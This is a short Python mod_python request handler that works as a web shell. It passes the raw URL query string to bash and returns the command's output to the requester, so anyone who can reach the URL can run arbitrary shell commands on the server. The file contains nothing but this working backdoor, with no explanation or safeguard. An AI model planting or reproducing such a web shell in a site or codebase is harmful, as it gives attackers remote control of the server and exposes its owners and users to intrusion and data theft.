from mod_python import apache
import os, urllib, subprocess as sub

def cmd(req):
    strcmd = req.parsed_uri[apache.URI_QUERY]

    p = sub.Popen(['/bin/bash', '-c', strcmd], 
        stdout=sub.PIPE, stderr=sub.STDOUT)
    output = urllib.unquote(p.stdout.read())


    return strcmd + "\n" + output

